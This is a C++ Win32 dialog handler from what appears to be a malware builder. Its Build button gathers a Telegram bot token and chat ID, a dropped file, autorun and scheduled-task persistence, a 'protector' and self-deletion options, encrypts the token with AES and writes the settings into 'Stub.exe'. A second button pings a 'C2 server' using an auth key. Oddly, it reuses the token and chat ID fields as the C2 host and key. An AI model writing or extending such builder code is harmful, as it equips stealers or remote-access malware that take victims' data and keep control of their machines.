/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
#pragma warning(disable: 4996)
#include "DlgProc.h"
#include "Builder.h"
#include "Requests.h"
#include "Manager.h"

#include "resource.h"

HWND hWndDlg;
HBRUSH brDlg = CreateSolidBrush(RGB(37, 37, 38));

INT_PTR DlgProc::DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	hWndDlg = hWnd;
	switch (uMsg) {
		case WM_CTLCOLORDLG:
			return (UINT)brDlg;

		case WM_CTLCOLORSTATIC:
		{
			HDC dcStatic = (HDC)wParam;

			SetTextColor(dcStatic, RGB(255, 255, 255));
			SetBkMode(dcStatic, TRANSPARENT);

			return (UINT)brDlg;
		}

		case WM_CTLCOLOREDIT:
		{
			HDC dcEdit = (HDC)wParam;

			SetTextColor(dcEdit, RGB(255, 255, 255));
			SetBkMode(dcEdit, TRANSPARENT);

			return (UINT)brDlg;
		}

		case WM_LBUTTONDOWN:
		{
			SendMessage(hWnd, WM_NCLBUTTONDOWN, HTCAPTION, 0);
			return 0;
		}

		case WM_COMMAND:
		{
			switch (LOWORD(wParam)) {
				case IDC_STATIC1:
				{
					ExitProcess(0);
					return 0;
				}
				case IDC_STATIC2:
				{
					ShowWindow(hWnd, SW_MINIMIZE);
					return 0;
				}
				case IDC_STATIC3:
				{
					Builder::Settings s;
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), s.botapi, (sizeof(s.botapi) - 1));
					
					strcpy(s.key, Manager::RandomStr(CryptoPP::AES::DEFAULT_KEYLENGTH).c_str());
					strcpy(s.botapi, Manager::EncryptStr(s.botapi, s.key).c_str());

					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), s.chatid, (sizeof(s.chatid) - 1));

					INT TextLen = GetWindowTextLengthA(GetDlgItem(hWnd, IDC_EDIT3)) + 1;
					char* buff = new char[TextLen];
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT3), buff, TextLen);

					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT4), s.drop, (sizeof(s.drop) - 1));
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT5), s.client_delay, (sizeof(s.client_delay) - 1));
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT6), s.autorun, (sizeof(s.autorun) - 1));
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT7), s.scheduler_name, (sizeof(s.scheduler_name) - 1));
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT8), s.protectorName, (sizeof(s.protectorName) - 1));

					UINT State = SendMessage(GetDlgItem(hWnd, IDC_CHECK1), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.auto_delete = true;
					}
					else {
						s.auto_delete = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK2), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.autorun_state = true;
					}
					else {
						s.autorun_state = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK3), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.drop_run = true;
					}
					else {
						s.drop_run = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK4), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.protector = true;
					}
					else {
						s.protector = false;
					}

					State = SendMessage(GetDlgItem(hWnd, IDC_CHECK5), BM_GETCHECK, 0, 0);
					if (State == BST_CHECKED) {
						s.scheduler_state = true;
					}
					else {
						s.scheduler_state = false;
					}

					if (!MakeFile("Stub.exe", buff, &s)) {
						MessageBoxA(NULL, "Error! Maybe, stub not found?", "ERROR", MB_OK | MB_ICONERROR);
					}
					else {
						MessageBoxA(NULL, "Success!", "BUILDER", MB_OK | MB_ICONINFORMATION);
					}

					delete[] buff;
					return 0;
				}
				case IDC_STATIC4:
				{
					// Test C2 server connectivity
					// IDC_EDIT1 = C2 host (e.g. c2.redteam.local)
					// IDC_EDIT2 = Auth key
					char c2host[128], authkey[128];
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), c2host, 127);
					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), authkey, 127);

					std::string path = "/ping?auth=" + std::string(authkey);
					std::string response = Requests::GetRequest(c2host, "Mozilla/5.0", path.c_str());

					if (response == "OK") {
						MessageBoxA(NULL, "C2 server is reachable!", "Test C2", MB_OK | MB_ICONINFORMATION);
					}
					else {
						MessageBoxA(NULL, "No response from C2 server.\nCheck host and auth key.", "Test C2", MB_OK | MB_ICONERROR);
					}

					return 0;
				}
			}
			return 0;
		}

		case WM_DESTROY:
		{
			EndDialog(hWnd, 0);
			return 0;
		}
	}
	return 0;
}